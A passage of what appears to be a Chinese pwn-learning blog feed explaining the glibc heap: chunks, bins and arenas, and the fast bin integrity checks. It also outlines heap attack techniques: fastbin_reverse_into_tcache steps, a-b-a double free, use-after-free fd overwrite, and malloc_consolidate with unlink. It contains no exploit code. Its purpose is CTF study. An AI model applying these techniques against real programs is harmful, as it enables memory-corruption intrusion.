+<h2 id="fastbin-reverse-into-tcache"><a href="#fastbin-reverse-into-tcache" class="headerlink" title="fastbin_reverse_into_tcache"></a>fastbin_reverse_into_tcache</h2><p>和上一个方法类似，不过这个利用的是fastbin，同样的这个是改写fd指针，但是由于fastbin是单链表，所以只需要改写fd的地址，并且当fd的值不为0时，需要额外free6个相同大小的块使得触发漏洞后需要改写的地址刚好在tcache首部。<br>1.首现free 7个0x40的块将tcache填满。<br>2.再次free 1个或7个块（取决于改写的地址fd的值是否为0）。<br>3.申请7个块清空tcache。<br>4.修改fastbin中最后一个块的fd值。<br>5.malloc(0x40)，使其将剩下的块填入到tcache中，由于是倒着添加的所以需要改写的地址将会出现在tcache中的首位，再次malloc对指定地址进行写。</p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>1.<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/implementation/tcache-zh/" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/implementation/tcache-zh/</a><br>2.<a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/4.14_glibc_tcache.html" rel="noopener">https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/4.14_glibc_tcache.html</a><br>3.<a href="https://github.com/shellphish/how2heap" rel="noopener">https://github.com/shellphish/how2heap</a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> pwn学习 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> pwn </tag>
+            
+            <tag> heap-overflow </tag>
+            
+            <tag> bins </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[fast_bin_note]]></title>
+      <url>/2020/07/31/fast-bin-note/</url>
+      <content type="html"><![CDATA[<p>本篇主要集中记录一下pwn中和fast bin有关的一些机制。虽然新版本的glibc添加了tcache功能，并且tcache在检查上似乎比fastbin少，大部分情况下是对tcache的攻击较多，但是新版本并没有删除fast bin并且检查机制基本没变，所以还是有必要记录一下。（本篇的源代码摘自glibc 2.23）</p>
+<h1 id="fast-bin相关的检查机制"><a href="#fast-bin相关的检查机制" class="headerlink" title="fast bin相关的检查机制"></a>fast bin相关的检查机制</h1><h2 id="free"><a href="#free" class="headerlink" title="free"></a>free</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">if (__builtin_expect ((uintptr_t) p &gt; (uintptr_t) -size, 0)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">      || __builtin_expect (misaligned_chunk (p), 0))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">    &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">      errstr &#x3D; &quot;free(): invalid pointer&quot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">    errout:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">      if (!have_lock &amp;&amp; locked)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">        (void) mutex_unlock (&amp;av-&gt;mutex);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">      malloc_printerr (check_action, errstr, chunk2mem (p), av);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">      return;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">if (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">    &#123;    </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">      errstr &#x3D; &quot;free(): invalid size&quot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">      goto errout;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr></table></figure>
+<p>free的时候首先是一个指针大小和有无对齐的检查，之后是size的检查，判断size是否小于最小值和是否对齐。不过这个size在取的时候已经将最后3位置0了，所以只需要保证倒数第四位是0就行。值得注意的是这个指针合理性的检查只存在free的时候，所以通过uaf等手段修改fd指针时不需要考虑对齐这个问题。<br>之后是判断块的大小属于的哪个bin，这里只考虑fast bin中的检查。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">if (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;&#x3D; 2 * SIZE_SZ, 0)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">    || __builtin_expect (chunksize (chunk_at_offset (p, size))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">                 &gt;&#x3D; av-&gt;system_mem, 0))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">if (__builtin_expect (old &#x3D;&#x3D; p, 0))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">      &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">        errstr &#x3D; &quot;double free or corruption (fasttop)&quot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">        goto errout;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">      &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">if (have_lock &amp;&amp; old !&#x3D; NULL &amp;&amp; __builtin_expect (old_idx !&#x3D; idx, 0))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">      &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">    errstr &#x3D; &quot;invalid fastbin entry (free)&quot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">    goto errout;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">      &#125;</span></pre></td></tr></table></figure>
+<p>首先是对free的这个块的下一个块的大小进行判断是否在合理的范围内，然后查看相应的fastbin链表中的第一个块是否是和要释放的块是一样的并保证它们都属于同一个fast bin，防止double free。之后是一些多线程的检查与细节上的处理，这里就不多说了。</p>
+<h2 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">if ((unsigned long) (nb) &lt;&#x3D; (unsigned long) (get_max_fast ())) </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">    &#123;    </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">      idx &#x3D; fastbin_index (nb);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">      mfastbinptr *fb &#x3D; &amp;fastbin (av, idx);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">      mchunkptr pp &#x3D; *fb; </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">      do   </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">        &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">          victim &#x3D; pp;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">          if (victim &#x3D;&#x3D; NULL)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">            break;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">      while ((pp &#x3D; catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">             !&#x3D; victim);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">      if (victim !&#x3D; 0)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">        &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">          if (__builtin_expect (fastbin_index (chunksize (victim)) !&#x3D; idx, 0))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">            &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">              errstr &#x3D; &quot;malloc(): memory corruption (fast)&quot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">            errout:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">              malloc_printerr (check_action, errstr, chunk2mem (victim), av); </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">              return NULL;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">            &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">          check_remalloced_chunk (av, victim, nb); </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">          void *p &#x3D; chunk2mem (victim);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">          alloc_perturb (p, bytes);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">          return p;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr></table></figure>
+<p>源码里面处理catomic_compare_and_exchange_val_acq这个函数似乎是lock-free算法，这个是防止多线程中出现的一些问题，这里也不多解释，反正最后是为了保证fast bin中的第一个块被正常取出。之后的检查也很简单，就检查了下相应的fast bin的第一个块的size是不是属于该bin，并且也没有检查第二个空闲块是否合理，由于fast bin只用了一个fd指针，所以fast bin的攻击相对其它bin简单很多，并且需要注意的是这里并没有对取出来的块的下一个物理相邻块的pre_inuse位进行设值和检查，这给malloc_consolidate提供了不错的攻击环境。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>free 伪造堆块需要注意的有：</p>
+<ol>
+<li>指向伪造堆块的指针要对齐</li>
+<li>伪造的堆块size除了要属于fastbin范围内也需要注意对齐。</li>
+<li>fastbin中的第一个块不能等与要释放的块，并且它的大小要属于这个bin。</li>
+<li>伪造的堆块的“下一个”物理相邻的堆块size大小是否属于正常范围内（似乎没做对齐检查）。</li>
+</ol>
+<p>malloc 伪造堆块需要注意的有：</p>
+<ol>
+<li>检查fast bin中的要取出的块（第一个块）size是否属于该bin。</li>
+</ol>
+<h1 id="相关的攻击"><a href="#相关的攻击" class="headerlink" title="相关的攻击"></a>相关的攻击</h1><h2 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h2><p>由于fast bin的double free检查只有对fast bin中的第一个块检查，所以可以a-b-a这样的free顺序绕过，之后通过修改fd指针达到改写内存的目的，不过要注意fd的指针指向的伪造块的size要属于这个fast bin。</p>
+<h2 id="use-after-free"><a href="#use-after-free" class="headerlink" title="use after free"></a>use after free</h2><p>和上面类似，也是通过对已经释放的指针进行修改。</p>
+<h2 id="malloc-consolidate"><a href="#malloc-consolidate" class="headerlink" title="malloc_consolidate"></a>malloc_consolidate</h2><p>这个函数是将fast bin中的块全部取出，检查是否能前后合并，之后放入相应的bin中，并修改下一个块的pre_inuse位，利用这个手段可以将fast bin放入到相应的small bin中，从而绕过fast bin中的double free检查。此时下一个物理相邻块的pre_inuse位并不会被改写，所以可以通过这个方法伪造堆块与其合并，并利用unlink手段（unlink的检查也很简单只判断了fd-&gt;bk==p和bk-&gt;fd==p）来修改内存。</p>
+]]></content>
+      
+        <categories>
+            
+            <category> pwn学习 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> pwn </tag>
+            
+            <tag> heap-overflow </tag>
+            
+            <tag> bins </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[linux_heap_chunk&bins]]></title>
+      <url>/2020/06/28/linux-heap-chunk-bins/</url>
+      <content type="html"><![CDATA[<p>本篇主要介绍linux中heap的回收机制，关于这方面的知识又不懂的可以去看看华庭的《glibc内存管理 ptmalloc源代码分析》虽然这篇文章有点久远，但是基本的管理机制和思路大同小异。</p>
+<h1 id="chunk的概念"><a href="#chunk的概念" class="headerlink" title="chunk的概念"></a>chunk的概念</h1><p>在chunk在glibc中是管理内存的最小单位，它将一段连续的堆空间分成多个部分并按照用户的需求分配给用户使用。chunk总共有四种状态：<br>1.allocated chunk(即正在使用的块)<br>2.free chunk(暂时未被使用的空闲块)<br>3.top chunk(arena顶部的空闲块)<br>4.last remainder chunk(当分配的块大于申请的块时被切分剩下部分的块)<br>这些类型的chunk都含有相同的结构，只是在不同的情况下有些数据并不会被用上。</p>
+<h2 id="chunk结构："><a href="#chunk结构：" class="headerlink" title="chunk结构："></a>chunk结构：</h2><figure class="image-box">
+                <img src="/img/posts-img/linux_heap_chunk&bins-1.png" alt="图1" title="" class="">
+                <p>图1</p>
+            </figure>
+<p>如图，前4（64位下是8个字节，后同）个字节是 <em>pre_size</em> ：表示前一个块的大小，但是当前一个块正在使用的话这4个字节将会被用来存储数据以节约空间。<br>后四个字节是 <em>size</em> 表示当前块的大小，这里的大小和通常比malloc申请的大小要大一点，因为需要在每一个块前加一个chunk header，并且为了方便管理在32位下是8字节对齐，64位下是16字节对齐，同时这将导致 <em>size</em> 的最后几位都是没有用的，所以为了节约空间最后3位被用做标志位：<br>1.PREV_INUSE(P)：这一位被用作标记 <em>前</em> 一个块是否被标记<br>2.IS_MMAPPED(M)：这一位被用作标记这个块是否由mmap产生的<br>3.NON_MAIN_ARENA(N)：这一位被用作标这个块记是否属于thread arena</p>
+<p>接下来是fd和bk，这里需要注意的是在这两个字段只有在空闲的时候才有意义，所以当这个块在被使用的时候，这一段被用于来存放数据。而在块处于空闲的时候：<br>fd–Forward pointer：指向同一个bin的下一个空闲块。<br>bk–Backward pointer：指向同一个bin的前一个空闲快<br>这里的bin是用于管理空闲块的链表，它通过fd和bk形成一个双向链表。这里需要注意fd和bk指向的前后块通常在内存中不是连续的。</p>
+<h2 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h2><p>属于比较特殊的free chunk，它位于arena的最顶部（内存高地址处）。这个chunk不属于任何bin，它只有在当前所有的空闲块都无法满足请求时，会分出一部分用于使用，剩下的成为新的top chunk。如果top chunk也无法满足请求时，则扩展brk（main arena）或者通过mmap（thread arena）分配新的堆。</p>
+<h2 id="last-remainder-chunk"><a href="#last-remainder-chunk" class="headerlink" title="last remainder chunk"></a>last remainder chunk</h2><p>当用户请求一个small chunk时，而相应的bin并没用可用的空闲块时，binmaps会去遍历更大的bins。如果没有找到则会通过 top chunk切分，如果找到了则会将找到的块切分成用户需要的大小，剩下的则变成last remainder chunk放入unsorted bin当中。这样当连续申请small bin时这些块将会很大概率在内存中时相邻的。</p>
+<h1 id="bins的概念"><a href="#bins的概念" class="headerlink" title="bins的概念"></a>bins的概念</h1><p>glibc为了提高空间的利用效率，设计了bin用于管理空闲资源。根据空闲块的大小，bins分为：</p>
+<ul>
+<li>Fast bin</li>
+<li>unsorted bin</li>
+<li>small bin</li>
+<li>large bin</li>
+</ul>
+<p>这些bin实际上就是一个指针指向第一个空闲块，然后根据之前介绍的fd和bk形成一个双向链表。<br>由于glibc中的fastbin是用于提高小块的利用效率所以他和其他的bin在检查和使用方面稍微有些不同，所以fastbin单独用 <em>fastbinsY</em> 数组存储，其余的都用 <em>bins</em> 数组存储。其中bins数组中：</p>
+<ul>
+<li>Bin 1 – Unsorted bin</li>
+<li>Bin 2 to Bin 63 – Small bin</li>
+<li>Bin 64 to Bin 126 – Large bin</li>
+</ul>
+<h1 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h1><p>fastbin存储的块大小范围在（16-80）字节（64位系统是32-160）。之前提到了fastbin个数为10，每一个fastbin存放着指向固定大小空闲块的指针，从下标为0开始它们分别存储大小为16, 24, 32, 40, 48, 56, 64, 72, 80（64位下是从32开始16字节递增）。然而在源代码中定义了fastbin的最大使用大小为（64字节）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">define DEFAULT_MXFAST     (64 * SIZE_SZ &#x2F; 4)</span></pre></td></tr></table></figure>
+<p>所以通常情况下fastbin只用到下标6为止。</p>
+<p>为了提高小堆块的使用速度，fastbin中即使有两个相邻的空闲块，他们也不会去合并（所有的空闲块的前一个使用位设置成1），同时为了可以快速获取堆块，fastbin采用的是单链表的方式将空闲块连接起来，并且添加和删除都是直接对fastbin中第一个块进行操作，也就是FILO（先进后出）的结构。在初始化的时候fastbin是空的，所以即使申请的大小属于fastbin，也不会交由fastbin来处理而是通过smallbin处理，如果还是空的则交给unsroted bin处理。</p>
+<figure class="image-box">
+                <img src="/img/posts-img/linux_heap_chunk&bins-2.png" alt="图2" title="" class="">
+                <p>图2</p>
+            </figure>
+
+
+<h1 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h1><p>当释放small chunk和large chunk（属于small bin和large bin大小范围的堆块）时，这些空闲块并不会第一时间放入相应的bin中，而是将他们添加到 unsorted bin。这样做是为了让glibc可以有第二次机会重新利用最近释放的chunk，同时还可以加快内存分配和释放速度。注意unsorted bin的个数只有1个，但是它存放的空闲块没有大小限制。</p>
+<h1 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h1><p>存放在small bin中的块称为small chunk，small bin 存放所有小于512字节的块（64位下是1024字节）。并且small bin的在内存管理上速度快于large bin但比fast bin慢。<br>small bin的特性与unsorted bin相似，但需要注意一下几点：</p>
+<ol>
+<li>small bin的个数有62个，它和unsorted bin一样是通过双向链表进行索引的，并且采用FIFO（先进先出）算法，当内存释放时添加进链表首端，而使用时则是从链表尾部获取。</li>
+<li>small bin之间每个存放的chunk的大小是8字节递增（64位是16字节），第一个bin中的大小为16（32）字节，通过这个我们可以算出small bin的最大为16 + 62 * 8 == 512字节</li>
+<li>与fast bin不同当有两个相邻（内存中相邻而不是bin链中）的空闲块，会合并成一个大的空闲块。合并后会添加至unsorted bin中</li>
+<li>small bin初始化类似fast bin，如果small bin没有满足要求的块时会交由unsorted bin处理，如果unsorted bin也没有则遍历后续的所有bins，如果还是没有则使用tio chunk。</li>
+</ol>
+<figure class="image-box">
+                <img src="/img/posts-img/linux_heap_chunk&bins-3.png" alt="图3" title="" class="">
+                <p>图3</p>
+            </figure>
+
+<p>这里有一个小坑，fast bin是单链表结构所以fastbinY数组中每一个位置都对应单独一个空闲块的链表，而其他的bin都是双向循环链表，所以bins的数组长度为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">mchunkptr bins[NBINS * 2 - 2];</span></pre></td></tr></table></figure>
+<p>也就是说，bins[0]和bins[1]代表的是unsorted bin的链表头的fd和bk。其他的和此类似。</p>
+<h1 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h1><p>large bin与small bin类似，他存放大于或等于512（1024）的块。它操作块的速度是最慢的。<br>large bin的特性如下：</p>
+<ol>
+<li>large bin的个数63，与small bin不同，每一个bin中的存储的块的大小是一个范围，并且存放的空闲块是按照从大到小的顺序排列。所以存取是对任意位置进行操作，并不算FIFO，但是对于相同的块而言是FIFO。</li>
+<li>large bin之间存放的堆块大小前32个bin是以64字节（64位也一样）递增，之后16个bin是以512字节递增，后8个是4096字节递增，再之后4个32768字节递增，然后2个是以262144字节，最后一个存放前面的bin无法存放的所有空闲块。</li>
+<li>空闲块的合并同small bin</li>
+<li>当申请 large chunk 时会优先找unsorted bin然后再去查看相应的bin中是否有空闲块，如果有则从尾部向前直到找到合适的块，如果没有，则通过binmap 查看之后的bin中是否有空闲块，如果找到了，则将块分成两个部分一个交由程序使用，另一个则进入unsorted bin中。否则使用top chunk</li>
+<li>large bin 中为了加快索引速度，large bin中的空闲块在fd和bk后又添加了两个指针，fd_nextsize 和 bk_nextsize，这两个指针只会指向和自己不同的大小上一个或者下一个块，查找空闲块时是通过这两个指针进行索引的。这样在查找时对于相同的块可以直接跳过加快查询速度。</li>
+</ol>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><table>
+<thead>
+<tr>
+<th align="center">bin</th>
+<th align="center">数量</th>
+<th align="center">是否是双向链表</th>
+<th align="center">同一个bin中大小是否相同</th>
+<th align="center">是否会前后合并</th>
+<th align="center">存取顺序</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">fast bin</td>
+<td align="center">10</td>
+<td align="center">否</td>
+<td align="center">是</td>
+<td align="center">否</td>
+<td align="center">FILO</td>
+</tr>
+<tr>
+<td align="center">unsorted bin</td>
+<td align="center">1</td>
+<td align="center">是</td>
+<td align="center">否</td>
+<td align="center">是</td>
+<td align="center">FIFO（对于满足条件的块而言）</td>
+</tr>
+<tr>
+<td align="center">small bin</td>
+<td align="center">62</td>
+<td align="center">是</td>
+<td align="center">是</td>
+<td align="center">是</td>
+<td align="center">FIFO</td>
+</tr>
+<tr>
+<td align="center">large bin</td>
+<td align="center">63</td>
+<td align="center">是</td>
+<td align="center">否</td>
+<td align="center">是</td>
+<td align="center">FIFO（对于相同大小的块而言）</td>
+</tr>
+</tbody></table>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>1.<a href="https://segmentfault.com/a/1190000005118060" rel="noopener">https://segmentfault.com/a/1190000005118060</a><br>2.<a href="https://segmentfault.com/a/1190000005183474" rel="noopener">https://segmentfault.com/a/1190000005183474</a><br>3.<a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/" rel="noopener">https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/</a><br>4.<a href="https://paper.seebug.org/445/" rel="noopener">https://paper.seebug.org/445/</a><br>5.<a href="https://blog.csdn.net/qq_41453285/article/details/96865321" rel="noopener">https://blog.csdn.net/qq_41453285/article/details/96865321</a><br>6.<a href="https://xz.aliyun.com/t/6596" rel="noopener">https://xz.aliyun.com/t/6596</a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> pwn学习 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> pwn </tag>
+            
+            <tag> heap-overflow </tag>
+            
+            <tag> bins </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[linux_heap_note]]></title>
+      <url>/2020/06/08/linux-heap-note/</url>
+      <content type="html"><![CDATA[<p>linux堆着一块的学习一直都是断断续续的，很多东西似懂非懂，所以特意写一篇文章来记录一些我觉得以后可能用得上的东西。</p>
+<h1 id="堆内存管理方式"><a href="#堆内存管理方式" class="headerlink" title="堆内存管理方式"></a>堆内存管理方式</h1><p>不同的平台有不同的内存管理方式，目前主要有如下几种内存管理机制：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">dlmalloc – General purpose allocator</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">ptmalloc2 – glibc</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">jemalloc – FreeBSD and Firefox</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">tcmalloc – Google</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">libumem – Solaris</span></pre></td></tr></table></figure>
+<p>每种内存管理机制都有它自己的适用场景，对于一些内存使用较大的应用它的表现性能主要看的就是内存的调度的效率。</p>
+<p>Linux早期使用的是dlmalloc，但是如果有两个线程同时调用malloc时，只能有一个线程可以访问临界资源，这使得堆的内存管理在多线程中效率低下，所以dlmalloc中fork出了新的分支–ptmalloc。在ptmalloc中，如果有两个线程同时调用malloc时，每个线程都会同时得到处理，因为每个线程都有各自维护一个堆空间和可利用空间表（freelist），它们被称为 <em>per thread arena</em>。</p>
+<h1 id="Linux下的malloc实现原理"><a href="#Linux下的malloc实现原理" class="headerlink" title="Linux下的malloc实现原理"></a>Linux下的malloc实现原理</h1><p>在Linux平台中malloc本质上是通过系统调用 <em>brk</em> 和 <em>mmap</em> 实现的：</p>
+<figure class="image-box">
+                <img src="/img/posts-img/linux_heap-1.png" alt="图1" title="" class="">
+                <p>图1</p>
+            </figure>
+
+<p><em>brk</em> ：brk通过移动程序间断点(program break location)来增加内存的（无0填充），在未初始化时堆的起始地址(start_brk)和结束地址(brk)会指向相同的位置—data/bss段的结束位置。而在ALSR开启后，则会加上一段随机的偏移。</p>
+<p><em>mmap</em> ：mmap创造的空间是私有且匿名的，分配的内存会被初始化为0，它只能被运行进程管理。</p>
+<figure class="image-box">
+                <img src="/img/posts-img/linux_heap-2.png" alt="图2" title="" class="">
+                <p>图2</p>
+            </figure>
+
+<p>详见：<a href="https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/" rel="noopener">https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/</a></p>
+<h1 id="主线程和子线程调用malloc"><a href="#主线程和子线程调用malloc" class="headerlink" title="主线程和子线程调用malloc"></a>主线程和子线程调用malloc</h1><p><a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/" rel="noopener">https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/</a> 这篇文章有代码演示，可以去看看详细。<br>在程序第一次使用堆空间之前堆是不会初始化的，而我参考的这篇文章代码中用了printf和getpid函数是需要用到堆空间的，但是不知道为啥文中似乎并没有这个影响，所以如果自己做实验的话推荐用setvbuf把输入输出的缓冲关掉，同时删除getpid这一行。</p>
+<p>在主线程中，当程序第一次调用malloc时，如果申请的空间不超过128kb（64位似乎是1mb）的话，会直接调用brk扩展132kb的空间，这段空间被称为arena，因为是主线程申请的所以叫main arena。这段空间由glibc管理，之后申请空间会优先使用mian arena 的部分，并且当空间用完或者空闲空间过多会通过改变程序间断点(brk)来调整堆的大小。</p>
+<p>在main arena中申请的空间按照需求分成一个个块（chunk），由glic的malloc库函数管理，当chunk被<br>释放（free）后会被添加到main arena的bin（这个是用于存储空闲块的一个双向链表结构）中而不是直接归还给系统。之后如果有新的空间申请会优先查询bins和topchunk</p>
+<p>当建立一个新的线程时，会初始化一个栈空间，并且只有在malloc之后才会通过mmap去分配堆空间。（注意这里申请的对空间虽然有1mb，但是只有132kb被标记为可读写，这段空间被称为tread arena），对于线程的空间管理剩下的和main arena相同</p>
+<h1 id="arena介绍"><a href="#arena介绍" class="headerlink" title="arena介绍"></a>arena介绍</h1><p>每一个线程并不是都可以有自己独立的arena，arena的数量是和系统中核心数相关的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">For 32 bit systems:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">     Number of arena &#x3D; 2 * number of cores + 1.</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">For 64 bit systems:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">     Number of arena &#x3D; 8 * number of cores + 1.</span></pre></td></tr></table></figure>
+<p>如果需要用到堆的线程超过了这个数量，该如何处理？</p>
+<p>假设我们有一台一核心的32位的电脑（arena数量最大=1*2+1=3）运行一个多线程的应用，共四线程–主线程和三个用户线程。</p>
